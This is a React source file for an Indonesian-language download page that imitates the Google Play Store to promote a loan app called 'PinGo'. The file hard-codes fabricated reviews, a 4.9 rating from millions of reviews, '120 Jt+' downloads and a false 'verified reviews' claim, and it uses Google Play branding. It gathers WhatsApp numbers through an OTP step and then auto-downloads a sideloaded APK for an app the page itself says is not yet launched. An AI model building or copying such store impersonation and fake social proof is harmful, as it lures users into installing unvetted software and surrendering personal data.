"use client"

import { useState, useRef, useEffect } from "react"
import { Star, ChevronLeft, ChevronRight, Share2, MoreVertical, Shield, Lock, Eye, Download, Users, Calendar, Check, ThumbsUp, ChevronDown, X, MessageCircle, Gift, PartyPopper } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Progress } from "@/components/ui/progress"
import { Separator } from "@/components/ui/separator"
import { Input } from "@/components/ui/input"

// APK 下载链接 - 可预留修改
const APK_DOWNLOAD_URL = "/pingo.apk"

// 应用截图数据
const screenshots = [
  { id: 1, alt: "PinGo App Screenshot 1" },
  { id: 2, alt: "PinGo App Screenshot 2" },
  { id: 3, alt: "PinGo App Screenshot 3" },
  { id: 4, alt: "PinGo App Screenshot 4" },
  { id: 5, alt: "PinGo App Screenshot 5" },
]

// 用户评价数据 (印尼语)
const reviews = [
  {
    id: 1,
    name: "Budi Santoso",
    avatar: "B",
    rating: 5,
    date: "2026/4/15",
    content: "Aplikasi pinjaman terbaik! Proses cepat dan bunga rendah. Sangat membantu kebutuhan mendesak saya.",
    helpful: 128,
  },
  {
    id: 2,
    name: "Siti Rahayu",
    avatar: "S",
    rating: 5,
    date: "2026/4/12",
    content: "Pencairan dana sangat cepat, hanya dalam hitungan menit. Customer service juga sangat ramah dan membantu.",
    helpful: 89,
  },
  {
    id: 3,
    name: "Ahmad Wijaya",
    avatar: "A",
    rating: 5,
    date: "2026/4/10",
    content: "Sudah 3 kali pinjam di sini, selalu lancar. Tenor fleksibel dan bunga kompetitif. Recommended!",
    helpful: 156,
  },
  {
    id: 4,
    name: "Dewi Lestari",
    avatar: "D",
    rating: 4,
    date: "2026/4/8",
    content: "Aplikasi mudah digunakan, proses verifikasi cepat. Limit pinjaman juga cukup besar.",
    helpful: 67,
  },
  {
    id: 5,
    name: "Rizki Pratama",
    avatar: "R",
    rating: 5,
    date: "2026/4/5",
    content: "Sangat puas dengan layanan PinGo. Dana cair dalam 10 menit setelah pengajuan disetujui!",
    helpful: 203,
  },
]

// 评分分布数据
const ratingDistribution = [
  { stars: 5, percentage: 78 },
  { stars: 4, percentage: 15 },
  { stars: 3, percentage: 4 },
  { stars: 2, percentage: 2 },
  { stars: 1, percentage: 1 },
]

// 类似应用数据
const similarApps = [
  { name: "Kredivo", rating: 4.7, icon: "K", color: "from-orange-500 to-orange-600" },
  { name: "Akulaku", rating: 4.5, icon: "A", color: "from-red-500 to-red-600" },
  { name: "Dana", rating: 4.8, icon: "D", color: "from-blue-500 to-blue-600" },
  { name: "OVO", rating: 4.6, icon: "O", color: "from-purple-500 to-purple-600" },
]

// 验证步骤
type VerificationStep = "phone" | "otp" | "success"

export default function DownloadPage() {
  // 验证弹窗状态
  const [showVerificationModal, setShowVerificationModal] = useState(false)
  const [verificationStep, setVerificationStep] = useState<VerificationStep>("phone")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [otpCode, setOtpCode] = useState(["", "", "", "", "", ""])
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const [countdown, setCountdown] = useState(0)
  
  // OTP 输入框引用
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([])

  // 倒计时效果
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000)
      return () => clearTimeout(timer)
    }
  }, [countdown])

  const handleDownload = () => {
    // 打开验证弹窗
    setShowVerificationModal(true)
    setVerificationStep("phone")
    setError("")
  }

  const handlePhoneSubmit = async () => {
    // 验证手机号格式 (印尼手机号)
    const cleanPhone = phoneNumber.replace(/\D/g, "")
    if (!cleanPhone || cleanPhone.length < 9 || cleanPhone.length > 15) {
      setError("Nomor telepon tidak valid")
      return
    }

    setIsLoading(true)
    setError("")

    try {
      const response = await fetch("/api/whatsapp-otp/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phoneNumber: cleanPhone }),
      })

      const data = await response.json()

      if (response.ok) {
        setVerificationStep("otp")
        setCountdown(60)
        setOtpCode(["", "", "", "", "", ""])
      } else {
        setError(data.error || "Gagal mengirim kode OTP")
      }
    } catch (err) {
      setError("Terjadi kesalahan. Silakan coba lagi.")
    } finally {
      setIsLoading(false)
    }
  }

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) {
      // 处理粘贴的情况
      const digits = value.replace(/\D/g, "").slice(0, 6).split("")
      const newOtp = [...otpCode]
      digits.forEach((digit, i) => {
        if (index + i < 6) {
          newOtp[index + i] = digit
        }
      })
      setOtpCode(newOtp)
      // 聚焦到下一个空位
      const nextIndex = Math.min(index + digits.length, 5)
      otpInputRefs.current[nextIndex]?.focus()
    } else {
      const newOtp = [...otpCode]
      newOtp[index] = value.replace(/\D/g, "")
      setOtpCode(newOtp)
      
      // 自动跳到下一个输入框
      if (value && index < 5) {
        otpInputRefs.current[index + 1]?.focus()
      }
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otpCode[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus()
    }
  }

  const handleOtpSubmit = async () => {
    const code = otpCode.join("")
    if (code.length !== 6) {
      setError("Masukkan kode OTP 6 digit")
      return
    }

    setIsLoading(true)
    setError("")

    try {
      const response = await fetch("/api/whatsapp-otp/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          phoneNumber: phoneNumber.replace(/\D/g, ""),
          otpCode: code 
        }),
      })

      const data = await response.json()

      if (response.ok) {
        setVerificationStep("success")
        // 触发 APK 下载
        setTimeout(() => {
          const link = document.createElement("a")
          link.href = APK_DOWNLOAD_URL
          link.download = "PinGo.apk"
          document.body.appendChild(link)
          link.click()
          document.body.removeChild(link)
        }, 1000)
      } else {
        setError(data.error || "Kode OTP salah")
      }
    } catch (err) {
      setError("Terjadi kesalahan. Silakan coba lagi.")
    } finally {
      setIsLoading(false)
    }
  }

  const handleResendOtp = async () => {
    if (countdown > 0) return
    
    setIsLoading(true)
    setError("")

    try {
      const response = await fetch("/api/whatsapp-otp/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phoneNumber: phoneNumber.replace(/\D/g, "") }),
      })

      if (response.ok) {
        setCountdown(60)
        setOtpCode(["", "", "", "", "", ""])
      } else {
        const data = await response.json()
        setError(data.error || "Gagal mengirim ulang kode OTP")
      }
    } catch (err) {
      setError("Terjadi kesalahan. Silakan coba lagi.")
    } finally {
      setIsLoading(false)
    }
  }

  const closeModal = () => {
    setShowVerificationModal(false)
    setVerificationStep("phone")
    setPhoneNumber("")
    setOtpCode(["", "", "", "", "", ""])
    setError("")
  }

  return (
    <main className="min-h-screen bg-white">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-white border-b border-gray-100">
        <div className="flex items-center justify-between px-4 h-14 max-w-md mx-auto">
          <button className="p-2 -ml-2 hover:bg-gray-100 rounded-full transition-colors">
            <ChevronLeft className="w-6 h-6 text-gray-700" />
          </button>
          <div className="flex items-center gap-1">
            <button className="p-2 hover:bg-gray-100 rounded-full transition-colors">
              <Share2 className="w-5 h-5 text-gray-700" />
            </button>
            <button className="p-2 hover:bg-gray-100 rounded-full transition-colors">
              <MoreVertical className="w-5 h-5 text-gray-700" />
            </button>
          </div>
        </div>
      </header>

      <div className="max-w-md mx-auto">
        {/* Promotion Banner */}
        <div className="bg-gradient-to-r from-[#01875f] to-[#00a676] mx-4 mt-4 rounded-xl p-3 flex items-center gap-3">
          <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center flex-shrink-0">
            <Gift className="w-5 h-5 text-white" />
          </div>
          <div className="flex-1">
            <p className="text-white font-semibold text-sm">Daftar & dapatkan kupon Rp 10.000!</p>
            <p className="text-white/80 text-xs mt-0.5">Kuota terbatas! Siapa cepat dia dapat</p>
          </div>
        </div>

        {/* App Info Section */}
        <section className="px-4 py-5">
          <div className="flex gap-4">
            {/* App Icon */}
            <div className="flex-shrink-0">
              <img
                src="/images/pingo-logo.jpg"
                alt="PinGo Logo"
                width="68"
                height="68"
                className="rounded-lg shadow-md"
                loading="eager"
                decoding="async"
                style={{ width: "68px", height: "68px" }}
              />
            </div>

            {/* App Details */}
            <div className="flex-1 min-w-0">
              <h1 className="text-xl font-semibold text-gray-900 leading-tight">
                PinGo - Pinjaman Online Cepat
              </h1>
              <p className="text-sm text-[#01875f] font-medium mt-0.5">
                Tanpa Iklan · Produk Pinjaman Terbaik Indonesia 2026
              </p>
            </div>
          </div>

          {/* Stats Row */}
          <div className="flex items-center justify-between mt-5 px-1">
            <div className="text-center flex-1">
              <div className="flex items-center justify-center gap-0.5">
                <span className="text-sm font-medium text-gray-900">4.9</span>
                <Star className="w-3.5 h-3.5 text-gray-700" />
              </div>
              <p className="text-[11px] text-gray-500 mt-0.5">570 Rb ulasan</p>
            </div>
            
            <Separator orientation="vertical" className="h-8 bg-gray-200" />
            
            <div className="text-center flex-1">
              <div className="flex items-center justify-center">
                <span className="text-sm font-medium text-gray-900">18+</span>
              </div>
              <p className="text-[11px] text-gray-500 mt-0.5">Usia</p>
            </div>
            
            <Separator orientation="vertical" className="h-8 bg-gray-200" />
            
            <div className="text-center flex-1">
              <p className="text-sm font-medium text-gray-900">12 MB</p>
              <p className="text-[11px] text-gray-500 mt-0.5">Ukuran</p>
            </div>
            
            <Separator orientation="vertical" className="h-8 bg-gray-200" />
            
            <div className="text-center flex-1">
              <div className="flex items-center justify-center">
                <Download className="w-4 h-4 text-gray-700" />
              </div>
              <p className="text-[11px] text-gray-500 mt-0.5">120 Jt+</p>
            </div>
          </div>

          {/* Install Button */}
          <Button 
            onClick={handleDownload}
            className="w-full h-12 mt-5 bg-[#01875f] hover:bg-[#016d4d] text-white font-medium text-base rounded-lg"
          >
            Instal
          </Button>
          
          {/* WhatsApp verification notice */}
          <p className="text-xs text-gray-500 text-center mt-2 flex items-center justify-center gap-1">
            <MessageCircle className="w-3.5 h-3.5 text-green-600" />
            Verifikasi melalui WhatsApp untuk mengunduh
          </p>
        </section>

        {/* Screenshots Section */}
        <section className="py-4">
          <div className="relative">
            <div className="flex gap-2 overflow-x-auto px-4 pb-2 scrollbar-hide snap-x snap-mandatory">
              {screenshots.map((screenshot, index) => (
                <div
                  key={screenshot.id}
                  className="flex-shrink-0 w-[110px] h-[195px] bg-gradient-to-br from-[#01875f] to-[#016d4d] rounded-lg snap-start relative overflow-hidden"
                >
                  <div className="absolute inset-0 flex items-center justify-center">
                    <div className="text-center text-white p-3">
                      <div className="w-10 h-10 mx-auto mb-2 bg-white/20 rounded-xl flex items-center justify-center">
                        <img
                          src="/images/pingo-logo.jpg"
                          alt="PinGo"
                          width="28"
                          height="28"
                          className="rounded-lg"
                          loading="lazy"
                          decoding="async"
                          style={{ width: "28px", height: "28px" }}
                        />
                      </div>
                      <p className="text-xs font-medium opacity-90">PinGo</p>
                      <p className="text-[10px] opacity-70 mt-1">Screenshot {index + 1}</p>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* About Section */}
        <section className="px-4 py-4">
          <div className="flex items-center justify-between mb-3">
            <h2 className="text-base font-medium text-gray-900">Tentang aplikasi ini</h2>
            <ChevronRight className="w-5 h-5 text-gray-400" />
          </div>
          <p className="text-sm text-gray-600 leading-relaxed">
            Limit tinggi, bunga rendah, tenor fleksibel, pencairan 3 menit
          </p>
          <div className="flex gap-2 mt-3">
            <Badge variant="outline" className="text-xs font-normal text-gray-700 border-gray-300 rounded-full px-3 py-1">
              Keuangan
            </Badge>
            <Badge variant="outline" className="text-xs font-normal text-gray-700 border-gray-300 rounded-full px-3 py-1">
              Pinjaman
            </Badge>
          </div>
        </section>

        <Separator className="mx-4" />

        {/* Data Safety Section */}
        <section className="px-4 py-4">
          <div className="flex items-center justify-between mb-3">
            <h2 className="text-base font-medium text-gray-900">Keamanan data</h2>
          </div>
          <p className="text-xs text-gray-500 leading-relaxed mb-4">
            Keamanan dimulai dengan memahami cara developer mengumpulkan dan membagikan data Anda. Praktik privasi dan keamanan data dapat bervariasi berdasarkan penggunaan, wilayah, dan usia Anda. Developer menyediakan informasi ini dan dapat memperbaruinya dari waktu ke waktu.
          </p>
          
          <div className="bg-gray-50 rounded-xl p-4 space-y-4 border border-gray-100">
            <div className="flex items-start gap-3">
              <Share2 className="w-5 h-5 text-gray-600 mt-0.5 flex-shrink-0" />
              <div>
                <p className="text-sm text-gray-900 font-medium">Tidak ada data yang dibagikan kepada pihak ketiga</p>
                <p className="text-xs text-gray-500 mt-0.5">Pelajari lebih lanjut cara developer menyatakan pembagian data</p>
              </div>
            </div>
            
            <div className="flex items-start gap-3">
              <Eye className="w-5 h-5 text-gray-600 mt-0.5 flex-shrink-0" />
              <div>
                <p className="text-sm text-gray-900 font-medium">Aplikasi ini mungkin mengumpulkan jenis data ini</p>
                <p className="text-xs text-gray-500 mt-0.5">Lokasi, Info pribadi, dan 7 lainnya</p>
              </div>
            </div>
            
            <div className="flex items-start gap-3">
              <Lock className="w-5 h-5 text-gray-600 mt-0.5 flex-shrink-0" />
              <p className="text-sm text-gray-600">Aplikasi tidak menyediakan cara untuk meminta penghapusan data</p>
            </div>
          </div>
        </section>

        <Separator className="mx-4" />

        {/* Ratings Section */}
        <section className="px-4 py-4">
          <div className="flex items-center justify-between mb-1">
            <h2 className="text-base font-medium text-gray-900">Rating dan ulasan</h2>
            <ChevronRight className="w-5 h-5 text-gray-400" />
          </div>
          <p className="text-xs text-gray-500 mb-4">
            Rating dan ulasan sudah diverifikasi dan berasal dari pengguna dengan jenis perangkat yang sama seperti milik Anda
          </p>

          <div className="flex gap-6">
            {/* Rating Number */}
            <div className="text-center">
              <p className="text-5xl font-light text-gray-900">4.9</p>
              <div className="flex justify-center mt-1">
                {[1, 2, 3, 4, 5].map((star) => (
                  <Star key={star} className="w-3 h-3 text-[#01875f] fill-current" />
                ))}
              </div>
              <p className="text-xs text-gray-500 mt-1">5.704.881</p>
            </div>

            {/* Rating Distribution */}
            <div className="flex-1 space-y-1.5">
              {ratingDistribution.map((item) => (
                <div key={item.stars} className="flex items-center gap-2">
                  <span className="text-xs text-gray-500 w-2">{item.stars}</span>
                  <div className="flex-1 h-2 bg-gray-200 rounded-full overflow-hidden">
                    <div 
                      className="h-full bg-[#01875f] rounded-full"
                      style={{ width: `${item.percentage}%` }}
                    />
                  </div>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* Reviews Section */}
        <section className="px-4 pb-4">
          <div className="space-y-1">
            {reviews.slice(0, 5).map((review) => (
              <div key={review.id} className="py-3">
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-3">
                    <div className="w-8 h-8 rounded-full bg-[#01875f] flex items-center justify-center">
                      <span className="text-sm font-medium text-white">{review.avatar}</span>
                    </div>
                    <span className="text-sm font-medium text-gray-900">{review.name}</span>
                  </div>
                  <button className="p-1 hover:bg-gray-100 rounded-full">
                    <MoreVertical className="w-4 h-4 text-gray-400" />
                  </button>
                </div>

                <div className="flex items-center gap-2 mt-2 ml-11">
                  <div className="flex">
                    {[1, 2, 3, 4, 5].map((star) => (
                      <Star
                        key={star}
                        className={`w-3 h-3 ${
                          star <= review.rating
                            ? "text-[#01875f] fill-current"
                            : "text-gray-300"
                        }`}
                      />
                    ))}
                  </div>
                  <span className="text-xs text-gray-500">{review.date}</span>
                </div>

                <p className="text-sm text-gray-700 mt-2 ml-11 leading-relaxed">
                  {review.content}
                </p>

                <p className="text-xs text-gray-500 mt-2 ml-11">
                  {review.helpful} orang menganggap ulasan ini membantu
                </p>
              </div>
            ))}
          </div>

          <button className="text-sm text-[#01875f] font-medium mt-2">
            Lihat semua ulasan
          </button>
        </section>

        <Separator className="mx-4" />

        {/* App Support Section */}
        <section className="px-4 py-4">
          <button className="flex items-center justify-between w-full">
            <h2 className="text-base font-medium text-gray-900">Dukungan aplikasi</h2>
            <ChevronDown className="w-5 h-5 text-gray-400" />
          </button>
        </section>

        <Separator className="mx-4" />

        {/* Similar Apps Section */}
        <section className="px-4 py-4">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-base font-medium text-gray-900">Aplikasi serupa</h2>
            <ChevronRight className="w-5 h-5 text-gray-400" />
          </div>

          <div className="flex gap-4 overflow-x-auto pb-2 scrollbar-hide">
            {similarApps.map((app) => (
              <div key={app.name} className="flex-shrink-0 w-20">
                <div className={`w-16 h-16 mx-auto rounded-xl bg-gradient-to-br ${app.color} flex items-center justify-center shadow-sm`}>
                  <span className="text-xl font-bold text-white">{app.icon}</span>
                </div>
                <p className="text-xs text-gray-900 text-center mt-2 truncate">{app.name}</p>
                <div className="flex items-center justify-center gap-0.5 mt-0.5">
                  <span className="text-xs text-gray-500">{app.rating}</span>
                  <Star className="w-2.5 h-2.5 text-gray-500" />
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* Footer */}
        <footer className="px-4 py-4 border-t border-gray-100">
          <button className="flex items-center gap-2 text-sm text-gray-600">
            <ChevronLeft className="w-4 h-4" />
            Kebijakan pengembalian dana Google Play
          </button>
        </footer>

        {/* Bottom Navigation */}
        <nav className="sticky bottom-0 bg-white border-t border-gray-100 py-2 px-2">
          <div className="flex items-center justify-around">
            <button className="flex flex-col items-center gap-0.5 px-4 py-1 text-gray-400">
              <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" />
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <span className="text-[10px]">Game</span>
            </button>
            <button className="flex flex-col items-center gap-0.5 px-4 py-1 text-gray-400">
              <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z" />
              </svg>
              <span className="text-[10px]">Aplikasi</span>
            </button>
            <button className="flex flex-col items-center gap-0.5 px-4 py-1 text-[#01875f]">
              <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
                <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" />
              </svg>
              <span className="text-[10px] font-medium">Telusuri</span>
            </button>
          </div>
        </nav>
      </div>

      {/* Verification Modal */}
      {showVerificationModal && (
        <div className="fixed inset-0 z-[100] flex items-end sm:items-center justify-center">
          {/* Backdrop */}
          <div 
            className="absolute inset-0 bg-black/50"
            onClick={closeModal}
          />
          
          {/* Modal Content */}
          <div className="relative w-full max-w-md bg-white rounded-t-3xl sm:rounded-2xl p-6 animate-in slide-in-from-bottom sm:slide-in-from-bottom-0 duration-300">
            {/* Close Button */}
            <button 
              onClick={closeModal}
              className="absolute right-4 top-4 p-2 hover:bg-gray-100 rounded-full transition-colors"
            >
              <X className="w-5 h-5 text-gray-500" />
            </button>

            {verificationStep === "phone" && (
              <>
                {/* WhatsApp Icon */}
                <div className="w-16 h-16 mx-auto mb-4 bg-green-500 rounded-full flex items-center justify-center">
                  <MessageCircle className="w-8 h-8 text-white" />
                </div>
                
                <h2 className="text-xl font-semibold text-center text-gray-900 mb-2">
                  Verifikasi WhatsApp
                </h2>
                <p className="text-sm text-gray-500 text-center mb-1">
                  Masukkan nomor WhatsApp Anda untuk menerima kode OTP
                </p>
                <div className="bg-amber-50 rounded-lg p-2 mb-6 border border-amber-200">
                  <p className="text-xs text-amber-800 font-medium flex items-center justify-center gap-1">
                    <Gift className="w-4 h-4 text-amber-600" />
                    Daftar sekarang & dapatkan kupon Rp 10.000! Kuota terbatas!
                  </p>
                </div>

                <div className="space-y-4">
                  <div>
                    <label className="text-sm font-medium text-gray-700 mb-1.5 block">
                      Nomor WhatsApp
                    </label>
                    <div className="flex gap-2">
                      <div className="flex items-center px-3 bg-gray-100 rounded-lg border border-gray-200 text-sm text-gray-600">
                        +62
                      </div>
                      <Input
                        type="tel"
                        placeholder="8123456789"
                        value={phoneNumber}
                        onChange={(e) => setPhoneNumber(e.target.value)}
                        className="flex-1 h-12"
                      />
                    </div>
                  </div>

                  {error && (
                    <p className="text-sm text-red-500 text-center">{error}</p>
                  )}

                  <Button
                    onClick={handlePhoneSubmit}
                    disabled={isLoading || !phoneNumber}
                    className="w-full h-12 bg-[#01875f] hover:bg-[#016d4d] text-white font-medium"
                  >
                    {isLoading ? "Mengirim..." : "Kirim Kode OTP"}
                  </Button>
                </div>
              </>
            )}

            {verificationStep === "otp" && (
              <>
                {/* WhatsApp Icon */}
                <div className="w-16 h-16 mx-auto mb-4 bg-green-500 rounded-full flex items-center justify-center">
                  <MessageCircle className="w-8 h-8 text-white" />
                </div>
                
                <h2 className="text-xl font-semibold text-center text-gray-900 mb-2">
                  Masukkan Kode OTP
                </h2>
                <p className="text-sm text-gray-500 text-center mb-6">
                  Kode OTP telah dikirim ke WhatsApp<br />
                  <span className="font-medium text-gray-700">+62 {phoneNumber}</span>
                </p>

                <div className="space-y-4">
                  {/* OTP Input */}
                  <div className="flex justify-center gap-2">
                    {otpCode.map((digit, index) => (
                      <input
                        key={index}
                        ref={(el) => { otpInputRefs.current[index] = el }}
                        type="text"
                        inputMode="numeric"
                        maxLength={6}
                        value={digit}
                        onChange={(e) => handleOtpChange(index, e.target.value)}
                        onKeyDown={(e) => handleOtpKeyDown(index, e)}
                        className="w-11 h-12 text-center text-xl font-semibold border border-gray-300 rounded-lg focus:border-[#01875f] focus:ring-1 focus:ring-[#01875f] outline-none transition-colors"
                      />
                    ))}
                  </div>

                  {error && (
                    <p className="text-sm text-red-500 text-center">{error}</p>
                  )}

                  <Button
                    onClick={handleOtpSubmit}
                    disabled={isLoading || otpCode.join("").length !== 6}
                    className="w-full h-12 bg-[#01875f] hover:bg-[#016d4d] text-white font-medium"
                  >
                    {isLoading ? "Memverifikasi..." : "Verifikasi"}
                  </Button>

                  <div className="text-center">
                    <p className="text-sm text-gray-500">
                      Tidak menerima kode?{" "}
                      {countdown > 0 ? (
                        <span className="text-gray-400">Kirim ulang dalam {countdown}s</span>
                      ) : (
                        <button
                          onClick={handleResendOtp}
                          disabled={isLoading}
                          className="text-[#01875f] font-medium hover:underline"
                        >
                          Kirim Ulang
                        </button>
                      )}
                    </p>
                  </div>
                </div>
              </>
            )}

            {verificationStep === "success" && (
              <div className="text-center py-4">
                {/* Success Animation */}
                <div className="w-20 h-20 mx-auto mb-4 bg-green-100 rounded-full flex items-center justify-center">
                  <div className="w-14 h-14 bg-[#01875f] rounded-full flex items-center justify-center animate-in zoom-in duration-300">
                    <Check className="w-8 h-8 text-white" />
                  </div>
                </div>
                
                <div className="flex items-center justify-center gap-2 mb-2">
                  <PartyPopper className="w-6 h-6 text-yellow-500" />
                  <h2 className="text-xl font-semibold text-gray-900">
                    Pendaftaran Berhasil!
                  </h2>
                  <PartyPopper className="w-6 h-6 text-yellow-500 scale-x-[-1]" />
                </div>
                
                <p className="text-sm text-gray-600 mb-2">
                  Selamat! Anda telah berhasil terdaftar.
                </p>

                {/* Coupon Card */}
                <div className="bg-gradient-to-r from-[#01875f] to-[#00a676] rounded-xl p-4 mb-4 text-white relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-24 h-24 bg-white/10 rounded-full -translate-y-1/2 translate-x-1/2" />
                  <div className="absolute bottom-0 left-0 w-16 h-16 bg-white/10 rounded-full translate-y-1/2 -translate-x-1/2" />
                  
                  <div className="relative">
                    <div className="flex items-center justify-center gap-2 mb-1">
                      <Gift className="w-5 h-5" />
                      <span className="text-sm font-medium">Anda mendapatkan kupon</span>
                    </div>
                    <p className="text-3xl font-bold">Rp 10.000</p>
                    <p className="text-xs text-white/80 mt-1">Dapat digunakan untuk pinjaman pertama Anda</p>
                  </div>
                </div>

                <div className="bg-amber-50 rounded-xl p-4 mb-4 border border-amber-200">
                  <p className="text-sm text-amber-800">
                    <span className="font-semibold">Aplikasi pinjaman akan segera diluncurkan!</span>
                    <br />
                    <span className="text-amber-700 text-xs mt-1 block">Setelah app tersedia, Anda dapat langsung mengajukan pinjaman. Nantikan ya!</span>
                  </p>
                </div>

                <Button
                  onClick={closeModal}
                  className="w-full h-12 bg-[#01875f] hover:bg-[#016d4d] text-white font-medium"
                >
                  Mengerti
                </Button>
              </div>
            )}
          </div>
        </div>
      )}
    </main>
  )
}
